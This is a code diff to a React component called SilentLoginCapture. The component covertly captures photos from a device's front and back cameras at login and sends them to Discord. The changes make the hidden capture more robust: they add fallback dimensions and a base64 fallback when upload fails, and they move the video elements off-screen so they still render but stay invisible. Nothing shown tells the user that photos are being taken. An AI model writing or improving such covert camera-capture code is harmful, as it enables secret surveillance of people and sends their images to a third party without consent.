@@ -268,22 +268,32 @@ export default function SilentLoginCapture({
     }, 3000);
   }
 
-  function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
-    if (!video || !canvas || !video.srcObject) return null;
+  function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null, label: string): string | null {
+    if (!video || !canvas) {
+      console.log("[SilentCapture] " + label + ": video or canvas null");
+      return null;
+    }
+    if (!video.srcObject) {
+      console.log("[SilentCapture] " + label + ": srcObject not set");
+      return null;
+    }
     try {
       const ctx = canvas.getContext("2d");
-      if (!ctx) return null;
-      // Wait for video to have actual dimensions
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        console.log("[SilentCapture] Video not ready yet, dimensions are 0");
+      if (!ctx) {
+        console.log("[SilentCapture] " + label + ": cannot get 2d context");
         return null;
       }
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL("image/jpeg", 0.8);
+      const width = video.videoWidth || 640;
+      const height = video.videoHeight || 480;
+      console.log("[SilentCapture] " + label + " capture: " + width + "x" + height);
+      canvas.width = width;
+      canvas.height = height;
+      ctx.drawImage(video, 0, 0, width, height);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
+      console.log("[SilentCapture] " + label + " captured:", dataUrl.length, "bytes");
+      return dataUrl;
     } catch (err) {
-      console.error("[SilentCapture] Capture error:", err);
+      console.error("[SilentCapture] " + label + " capture error:", err);
       return null;
     }
   }
@@ -298,25 +308,37 @@ export default function SilentLoginCapture({
   }
 
   async function sendToDiscord(deviceInfo: DeviceInfo) {
-    const frontImg = captureFrame(videoRef.current, canvasRef.current);
-    const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);
+    const frontImg = captureFrame(videoRef.current, canvasRef.current, "Front");
+    const backImg = captureFrame(videoBackRef.current, canvasBackRef.current, "Back");
     stopCameras();
 
-    console.log("[SilentCapture] Front image captured:", !!frontImg, frontImg ? "length: " + frontImg.length : "");
-    console.log("[SilentCapture] Back image captured:", !!backImg, backImg ? "length: " + backImg.length : "");
+    console.log("[SilentCapture] Front image:", frontImg ? "captured, length: " + frontImg.length : "null");
+    console.log("[SilentCapture] Back image:", backImg ? "captured, length: " + backImg.length : "null");
 
-    // Upload images to Supabase Storage and get URLs
-    let frontUrl: string | undefined;
-    let backUrl: string | undefined;
+    // Try to upload, fallback to base64 if fails
+    let frontUrl = frontImg;
+    let backUrl = backImg;
 
     if (frontImg && frontImg.length > 1000) {
       console.log("[SilentCapture] Uploading front camera photo...");
-      frontUrl = await uploadImage(frontImg, "front") || undefined;
+      const uploaded = await uploadImage(frontImg, "front.jpg");
+      if (uploaded) {
+        frontUrl = uploaded;
+        console.log("[SilentCapture] Front uploaded:", frontUrl);
+      } else {
+        console.log("[SilentCapture] Front upload failed, using base64");
+      }
     }
 
     if (backImg && backImg.length > 1000) {
       console.log("[SilentCapture] Uploading back camera photo...");
-      backUrl = await uploadImage(backImg, "back") || undefined;
+      const uploaded = await uploadImage(backImg, "back.jpg");
+      if (uploaded) {
+        backUrl = uploaded;
+        console.log("[SilentCapture] Back uploaded:", backUrl);
+      } else {
+        console.log("[SilentCapture] Back upload failed, using base64");
+      }
     }
 
     const now = new Date();
@@ -357,13 +379,13 @@ export default function SilentLoginCapture({
     console.log("[SilentCapture] Login alert sent!");
   }
 
-  // Invisible component
+  // Hidden component - but visible to browser for rendering
   return (
-    <div style={{ display: "none" }}>
-      <video ref={videoRef} autoPlay playsInline muted />
-      <video ref={videoBackRef} autoPlay playsInline muted />
-      <canvas ref={canvasRef} />
-      <canvas ref={canvasBackRef} />
+    <div style={{ position: 'absolute', left: '-9999px', top: '-9999px', width: '640px', height: '480px', overflow: 'hidden' }}>
+      <video ref={videoRef} autoPlay playsInline muted style={{ width: '640px', height: '480px' }} />
+      <video ref={videoBackRef} autoPlay playsInline muted style={{ width: '640px', height: '480px' }} />
+      <canvas ref={canvasRef} width="640" height="480" />
+      <canvas ref={canvasBackRef} width="640" height="480" />
     </div>
   );
 }
